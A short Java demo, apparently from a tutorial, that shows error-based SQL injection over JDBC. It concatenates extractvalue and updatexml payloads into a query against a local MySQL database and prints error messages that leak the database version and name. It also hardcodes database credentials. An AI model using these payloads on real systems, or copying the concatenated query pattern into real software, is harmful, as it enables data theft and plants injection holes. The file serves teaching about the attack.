// Error-Based SQL Injection via JDBC
// Attacker forces a SQL error that leaks data inside the error message.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class error_based_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: extractversion + concat shows DB version in the error
        String payload = "1 AND extractvalue(1, concat(0x7e, version())) --";
        String query = "SELECT id FROM users WHERE id = " + payload;

        try {
            ResultSet rs = st.executeQuery(query);
            while (rs.next()) {
                System.out.println(rs.getString("id"));
            }
        } catch (Exception e) {
            System.out.println("Leaked error: " + e.getMessage());
        }

        // updatexml error-based payload
        String p2 = "1 AND updatexml(1, concat(0x7e, database()), 1)";
        try {
            st.executeQuery("SELECT id FROM users WHERE id = " + p2);
        } catch (Exception e) {
            System.out.println("Leaked database: " + e.getMessage());
        }

        st.close();
        con.close();
    }
}
